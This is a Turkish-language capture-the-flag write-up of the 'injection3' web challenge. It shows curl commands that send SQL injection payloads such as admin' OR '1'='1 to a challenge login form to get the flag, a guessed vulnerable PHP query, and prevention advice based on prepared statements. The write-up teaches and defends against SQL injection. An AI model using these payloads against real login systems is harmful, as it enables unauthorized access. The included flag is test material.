# 💉 injection3 - Web Challenge 

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Boolean Blind SQLi-purple?style=for-the-badge" alt="SQL Injection">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500  

**Açıklama:** Agresif araçlara gerek yok!

**Challenge URL:** http://64.226.74.243:10003/

---

## 🔍 Analiz

**Hedef:** Boolean-based Blind SQL Injection kullanarak authentication bypass yapıp flag elde etmek

**Strateji:** Form analizi → Boolean-based SQL Injection → Flag

**İpuçları:**
- 🎯 "Agresif araçlara gerek yok" → SQLMap gibi otomatik araçlar kullanmaya gerek yok
- 💉 "injection3" → SQL Injection zafiyeti var
- 🔍 "No errors. Only true or false" → Blind SQL Injection!

---

## ✅ Çözüm Adımları

### 🔧 **Adım 1: Form Analizi - cURL ile Keşif**

**Terminalden HTTP response'u inceliyoruz:**

```bash
curl http://64.226.74.243:10003/
```

**Response:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Medium2 Login</title>
</head>
<body>
<h2>Login</h2>
<form method="POST">
    <input type="text" name="username" placeholder="username"><br><br>
    <input type="text" name="password" placeholder="password"><br><br>
    <button type="submit">Login</button>
</form>
<p><i>No errors. Only true or false.</i></p>
</body>
</html>
```

**Form Analizi:**
- ✅ **Method:** POST
- ✅ **Parametreler:** `username` ve `password`
- 🔑 **KRİTİK İPUCU:** "No errors. Only true or false."
- 💡 **Sonuç:** Bu bir **Blind SQL Injection** challenge'ı!

**Blind SQL Injection Nedir?**
- SQL hataları gösterilmez
- Sadece TRUE/FALSE yanıtları vardır
- Yanıt farklılıklarından bilgi çıkarılır

---

### 🧪 **Adım 2: Başarısız Giriş Testi**

**Normal bir giriş denemesi yapalım:**

```bash
curl -X POST http://64.226.74.243:10003/ -d "username=test&password=test"
```

**Response:**

```html
<h2>Invalid credentials</h2>
```

**Sonuç:** ❌ FALSE durumu - "Invalid credentials" mesajı

---

### 💎 **Adım 3: Boolean-based SQL Injection - EXPLOIT!**

**OR operatörü ile her zaman TRUE dönen bir koşul oluşturuyoruz:**

```bash
curl -X POST http://64.226.74.243:10003/ -d "username=admin' OR '1'='1&password=test"
```

**🎉 BINGO! Response:**

```html
<h2>Welcome!</h2>
<pre>FLAG{boolenbasedSqliSuccess500dolarbounty48465212387955896}</pre>
```

**✅ BAŞARILI! Analiz:**
- ✅ **Flag elde edildi!**
- 🎯 `admin' OR '1'='1` payloadu her zaman TRUE döndü
- ✅ Authentication bypass başarılı

---

### 🔬 **Bonus: Alternatif Başarılı Payloadlar**

**Diğer çalışan payloadlar:**

```bash
# Payload 1: Comment bypass
curl -X POST http://64.226.74.243:10003/ -d "username=admin'--&password="
# ✅ BAŞARILI

# Payload 2: OR 1=1
curl -X POST http://64.226.74.243:10003/ -d "username=' OR 1=1--&password="
# ✅ BAŞARILI

# Payload 3: Boolean test (TRUE)
curl -X POST http://64.226.74.243:10003/ -d "username=admin' AND '1'='1'--&password="
# ✅ BAŞARILI (eğer admin kullanıcısı varsa)

# Payload 4: Boolean test (FALSE)
curl -X POST http://64.226.74.243:10003/ -d "username=admin' AND '1'='2'--&password="
# ❌ BAŞARISIZ - "Invalid credentials"
```

---

## 🏁 **FLAG**

```
FLAG{boolenbasedSqliSuccess500dolarbounty48465212387955896}
```

---

## 🧬 Teknik Analiz

### **Güvensiz Kod Akışı**

```php
// GÜVENSIZ KOD (Tahmini)
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $mysqli->query($query);

if ($result && $result->num_rows > 0) {
    echo "<h2>Welcome!</h2>";
    echo "<pre>FLAG{...}</pre>";
} else {
    echo "<h2>Invalid credentials</h2>";
}
```

**Özellik:**
- ❌ SQL hataları gösterilmiyor
- ✅ Sadece "Welcome" veya "Invalid credentials"
- 💡 Bu Blind SQL Injection için ideal ortam

---

### **Exploit Akışı**

**Normal akış:**
```sql
SELECT * FROM users WHERE username = 'test' AND password = 'test'
# Sonuç: 0 rows → "Invalid credentials"
```

**Exploit akışı:**
```sql
# Input: username=admin' OR '1'='1, password=test
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'test'
                                              ↑
                                    Bu her zaman TRUE!

# Operatör önceliği nedeniyle:
SELECT * FROM users WHERE username = 'admin' OR ('1'='1' AND password = 'test')

# Veya daha basit yorumlama:
SELECT * FROM users WHERE username = 'admin' OR TRUE
# Sonuç: En az 1 row → "Welcome!"
```

**Boolean Mantık:**
- ✅ `'1'='1'` → Her zaman TRUE
- ✅ `username = 'admin' OR TRUE` → Her zaman TRUE
- ✅ En az bir kullanıcı döner → Authentication bypass!

---

### **Blind SQL Injection Karşılaştırması**

| **Durum** | **Payload** | **Sonuç** | **Response** |
|-----------|-------------|-----------|--------------|
| Normal | `test` / `test` | FALSE | Invalid credentials |
| TRUE Injection | `admin' OR '1'='1` | TRUE | Welcome! + FLAG |
| FALSE Test | `admin' AND '1'='2'--` | FALSE | Invalid credentials |

---

## 🛡️ Nasıl Önlenir?

### **1. Prepared Statements (En İyi Yöntem)**

```php
// GÜVENLİ KOD
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    echo "<h2>Welcome!</h2>";
} else {
    echo "<h2>Invalid credentials</h2>";
}
```

**Neden güvenli:**
- ✅ `?` placeholder'ları kullanılıyor
- ✅ `bind_param()` değerleri otomatik escape ediyor
- ✅ SQL injection imkansız

---

### **2. Input Validation**

```php
// Ek güvenlik katmanı
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username format");
}
```

---

### **3. Hata Mesajlarını Gizleme**

```php
// Detaylı SQL hatalarını gösterme
mysqli_report(MYSQLI_REPORT_OFF);

// Genel hata mesajı kullan
if ($mysqli->error) {
    error_log($mysqli->error);  // Loglara yaz
    echo "An error occurred";   // Kullanıcıya genel mesaj
}
```

**Önemli:**
- ❌ Hata gizleme tek başına YETERLI DEĞİL!
- ✅ Mutlaka prepared statements kullanılmalı
- ✅ Hata gizleme ek bir güvenlik katmanıdır

---

## 🛠️ **Kullanılan Komutlar**

```bash
# İlk keşif
curl http://64.226.74.243:10003/

# Verbose mod
curl -v http://64.226.74.243:10003/

# Başarısız giriş testi
curl -X POST http://64.226.74.243:10003/ -d "username=test&password=test"

# EXPLOIT - Boolean-based SQL Injection
curl -X POST http://64.226.74.243:10003/ -d "username=admin' OR '1'='1&password=test"

# Alternatif payloadlar
curl -X POST http://64.226.74.243:10003/ -d "username=admin'--&password="
curl -X POST http://64.226.74.243:10003/ -d "username=' OR 1=1--&password="
```

---

## 💭 **Çözüm Akışı**

```
🌐 injection3 Web Challenge
            ↓
🔧 Form analizi (curl)
   → POST method
   → username, password parametreleri
   → Hint: "No errors. Only true or false."
            ↓
🔍 Blind SQL Injection Keşfi
   → Hata mesajları yok
   → Sadece TRUE/FALSE yanıtları
            ↓
🧪 Boolean Testi
   → test/test → "Invalid credentials" (FALSE)
            ↓
💎 SQL Injection Bypass
   → admin' OR '1'='1 → Her zaman TRUE
   → Authentication bypass
            ↓
🏁 FLAG{boolenbasedSqliSuccess500dolarbounty48465212387955896}
```
